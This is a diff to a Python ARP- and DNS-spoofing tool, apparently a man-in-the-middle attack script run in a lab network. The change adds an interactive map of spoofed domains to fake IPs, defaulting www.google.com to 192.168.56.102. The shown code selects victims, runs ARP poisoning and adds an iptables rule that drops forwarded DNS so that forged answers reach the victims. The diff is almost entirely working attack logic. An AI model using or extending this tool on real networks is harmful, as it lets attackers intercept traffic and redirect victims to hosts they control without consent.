@@ -10,6 +10,7 @@ import os
 def clear_screen():
     os.system("cls" if os.name == "nt" else "clear")
 
+
 def print_banner():
     clear_screen()
     print("=" * 50)
@@ -68,21 +69,23 @@ def choose_victims(hosts, gateway):
         except Exception:
             print("Invalid input. Please try again.")
 
-def choose_arp_settings():
-    print("\n[*] Choose ARP spoofing type:")
-    print("  1. Normal ARP spoofing (MITM, modify packets)")
-    print("  2. Anonymous ARP spoofing (SMITM, only sniff traffic)")
+def choose_arp_settings(enables_dns):
+    anonymous = False
+    if not enables_dns:
+        print("\n[*] Choose ARP spoofing type:")
+        print("  1. Normal ARP spoofing (MITM, modify packets)")
+        print("  2. Anonymous ARP spoofing (SMITM, only sniff traffic)")
 
-    while True:
-        mode_input = input("Your choice [1-2]: ").strip()
-        if mode_input == "1":
-            anonymous = False
-            break
-        elif mode_input == "2":
-            anonymous = True
-            break
-        else:
-            print("Invalid input. Please choose 1 or 2.")
+        while True:
+            mode_input = input("Your choice [1-2]: ").strip()
+            if mode_input == "1":
+                anonymous = False
+                break
+            elif mode_input == "2":
+                anonymous = True
+                break
+            else:
+                print("Invalid input. Please choose 1 or 2.")
 
     print("\n[*] Choose ARP spoofing frequency:")
     print("  1. Fast (1 second)")
@@ -129,13 +132,26 @@ def launch_attack(enable_dns):
         print("[-] No victims selected.")
         sys.exit(1)
 
-    anonymous, interval = choose_arp_settings()
+    anonymous, interval = choose_arp_settings(enable_dns)
 
-    fake_ip = "192.168.56.102"
+    domain_ip_map = {}
     if enable_dns:
-        ip_input = input("\nEnter fake IP for DNS spoofing [default: {}]: ".format(fake_ip)).strip()
-        if ip_input:
-            fake_ip = ip_input
+        print("\nEnter the domains you want to spoof and their fake IPs.")
+        print("Leave empty and press Enter directly to use default: www.google.com -> 192.168.56.102")
+        added = False
+        while True:
+            domain = input("Domain to spoof (or press Enter to finish): ").strip().lower()
+            if not domain:
+                break
+            ip = input("Fake IP to redirect '{}': ".format(domain)).strip()
+            if ip:
+                domain_ip_map[domain] = ip
+                added = True
+
+        if not added:
+            domain_ip_map = {"www.google.com": "192.168.56.102"}
+
+
 
     stop_event = threading.Event()
     print("\n[*] Launching ARP spoofing on {} target(s)...".format(len(victims)))
@@ -151,7 +167,8 @@ def launch_attack(enable_dns):
         if enable_dns:
             print("[*] Starting DNS spoofing...")
             os.system("iptables -I FORWARD -p udp --dport 53 -j DROP")
-            start_dns_spoofer(fake_ip=fake_ip, iface=iface)
+            start_dns_spoofer(domain_ip_map, iface)
+
         else:
             print("[*] ARP spoofing running. Press Ctrl+C to stop...")
             while True:
